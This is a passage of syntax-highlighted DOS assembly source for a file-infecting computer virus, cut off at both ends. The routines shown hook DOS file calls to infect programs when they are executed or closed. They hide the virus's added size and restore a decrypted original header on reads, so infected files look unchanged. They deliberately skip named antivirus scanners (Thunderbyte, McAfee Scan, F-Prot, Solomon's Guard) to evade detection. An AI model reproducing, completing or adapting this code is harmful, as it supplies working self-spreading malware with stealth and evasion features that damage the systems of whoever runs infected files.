        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">do_open</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Get sft for file handle</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_changes</span><span class="sc0">
</span><span class="sc1">;Check if file is infected        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_changes</span><span class="sc0">
</span><span class="sc1">;If infected stealth true size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc5">lenvir</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">no_changes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Read file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dos_read</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Restore function entry regs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Duplicate handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_read_stealth</span><span class="sc0">        
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Close new handle in order to update directory entry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Get address of sft entry</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">        
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_read_stealth</span><span class="sc0">        
</span><span class="sc1">;Check if file is already infected        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_read_stealth</span><span class="sc0">
</span><span class="sc1">;Check and save current offset in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0019h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">no_read_stealth</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_read_stealth</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_offset</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
</span><span class="sc1">;Save address of read buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">read_off</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">read_seg</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc1">;Perform read operation</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">check_read</span><span class="sc0">
</span><span class="sc1">;Error during file read</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">no_read_stealth</span><span class="sc4">:</span><span class="sc0">       
</span><span class="sc1">;Exit if no read stealth        </span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc5">check_read</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
</span><span class="sc1">;Save offset position</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Save file size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Add virus size to file size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc5">lenvir</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc1">;Point to old header in file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">0019h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc1">;Read old header and encryption key</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0019h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_read</span><span class="sc0">
</span><span class="sc1">;Decrypt header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0019h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">decrypt_header</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decrypt_header</span><span class="sc0">
</span><span class="sc1">;Move old header into read buffer</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">read_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0019h</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_offset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">exit_read</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
</span><span class="sc1">;Restore file size</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Restore old offset in file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Restore regs and exit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unhook_ints</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Infect file at execution ds:dx ptr to filename</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dos_exec</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Open file for read-only</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_file_open</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc5">ok_file_open</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">from_open</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Infect file at close</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">dos_close</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc1">;Duplicate handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;Close new handle in order to update directory entry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">from_open</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Get sft address in es:di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_sft</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc1">;Check device info word</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">05h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Check if character device handle       </span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc1">;Check if remote file handle</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc1">;Check if file is already infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc1">;Do not infect files with todays date</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">today</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc1">;Check file name in sft</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">name_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Do not infect files with numbers in their file name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">file_name1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc3">"9"</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc5">file_name1</span><span class="sc4">:</span><span class="sc0">       
</span><span class="sc1">;Do not infect files witch name contains v's</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc3">"V"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc1">;Do not infect files with mo in their name</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">name_loop</span><span class="sc0">
</span><span class="sc1">;Get first pair</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Do not infect Thunderbyte antivirus utils        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"BT"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc1">;Do not infect McAfee's Scan</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"CS"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc1">;Do not infect F-Prot scanner</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"-F"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_error</span><span class="sc0">
</span><span class="sc1">;Do not infect Solomon's Guard</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"UG"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">file_infection</span><span class="sc0">
</span><span class="sc5">file_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">
</span><span class="sc5">file_infection</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Save and set file open mode (read/write)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc1">;Save and set file attribute</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">system_file</span><span class="sc0">
</span><span class="sc1">;Save and set file pointer position</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_begin</span><span class="sc0">
</span><span class="sc1">;Read first 20h bytes </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0020h</span><span class="sc0">
